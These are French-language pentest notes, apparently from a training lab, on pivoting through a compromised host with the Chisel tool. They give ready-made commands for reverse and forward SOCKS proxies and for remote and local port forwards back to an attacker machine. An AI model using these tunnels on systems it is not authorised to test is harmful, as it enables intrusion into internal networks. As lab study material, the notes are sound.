>Chisel utilise un proxy **SOCKS5**

Nous examinerons deux utilisations du ciseau dans cette tâche (un proxy SOCKS et une redirection de port)

## Reverse SOCKS Proxy - Proxy socks inverse

Cela se connecte à partir d'un serveur compromis à un écouteur en attente sur notre machine attaquante.

- Sur notre KALI:

```sh
# Sur notre KALI
chisel server -p LISTEN_PORT --reverse &
```

- Sur l'hôte compromis:

```sh
chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

---
## Forward SOCKS Proxy - Proxy SOCKS direct

les proxys directs sont plus rares que les proxys inverses pour la même raison que les shells inversés sont plus courants que les shells de liaison ; De manière générale, les pare-feu de sortie (qui gèrent le trafic sortant) sont moins stricts que les pare-feu d'entrée (qui gèrent les connexions entrantes). 

- Sur l'hôte compromis:

```sh
chisel server -p LISTEN_PORT --socks5
```

- Sur notre KALI:

```sh
chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
# PROXY_PORT est le port qui sera ouvert pour le proxy.
```

Par exemple, `./chisel client 172.16.0.10:8080 1337:socks` se connecterait à un serveur chisel exécuté sur le port 8080 de 172.16.0.10. Un proxy SOCKS serait ouvert sur le port 1337 de notre machine attaquante.

---
## Remote Port Forward - Transfert de port distant

Un transfert de port distant se produit lorsque nous nous reconnectons à partir d'une cible compromise pour créer le transfert.

- Sur notre KALI:

```sh
chisel server -p LISTEN_PORT --reverse &
```

- Sur l'hôte compromis:

```sh
chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

`LOCAL_PORT` est le port que nous souhaitons ouvrir sur notre propre machine attaquante pour établir une liaison avec le port cible souhaité.


Pour utiliser un vieil exemple, supposons que notre propre IP est 172.16.0.20, l'IP du serveur compromis est 172.16.0.5, et notre cible est le port 22 sur 172.16.0.10. La syntaxe pour rediriger 172.16.0.10:22 vers le port 2222 sur notre machine attaquante serait la suivante :

```sh
chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

La reconnexion à notre machine attaquante, fonctionnant comme un serveur burin, a commencé par :

```sh
chisel server -p 1337 --reverse &
```

Cela nous permettrait d'accéder à 172.16.0.10:22 (via SSH) en naviguant vers 127.0.0.1:2222.

---
## Local Port Forward - Transfert de port local

un transfert de port local est l'endroit où nous nous connectons de notre propre machine attaquante à un serveur chisel écoutant sur une cible compromise.

Sur la cible compromise:

```sh
chisel server -p LISTEN_PORT
```

- Sur KALI:

```sh
chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

Par exemple, pour se connecter à 172.16.0.5:8000 (l'hôte compromis exécutant un serveur chisel), en transférant notre port local 2222 vers 172.16.0.10:22 (notre cible), nous pourrions utiliser :

```sh
chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```